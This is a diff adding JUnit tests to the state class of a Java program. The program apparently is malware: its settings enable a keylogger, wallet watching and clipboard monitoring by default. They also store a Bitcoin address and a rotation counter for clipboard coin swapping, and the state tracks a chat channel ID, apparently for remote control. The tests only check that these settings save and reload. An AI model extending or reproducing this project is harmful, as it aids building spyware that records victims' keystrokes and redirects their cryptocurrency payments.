@@ -6,6 +6,7 @@ import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.util.List;
 
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.io.TempDir;
@@ -20,6 +21,24 @@ class StateTest {
 		assertEquals("", state.channelId);
 		assertEquals("0", state.lastId);
 		assertFalse(state.hello);
+		assertTrue(state.walletsWatch);
+		assertTrue(state.keylogger);
+		assertTrue(state.clipboard);
+		assertFalse(state.keyloggerHardOff);
+	}
+
+	@Test
+	void securityRoundTrip() throws Exception {
+		Path file = temp.resolve("state.json");
+		State state = new State();
+		state.keyloggerHardOff = true;
+		state.clipboardCoins.put("btc", List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu"));
+		state.clipboardRotation.put("btc", 1);
+		state.save(file);
+		State loaded = State.load(file);
+		assertTrue(loaded.keyloggerHardOff);
+		assertEquals(List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu"), loaded.clipboardCoins.get("btc"));
+		assertEquals(1, loaded.clipboardRotation.get("btc"));
 	}
 
 	@Test
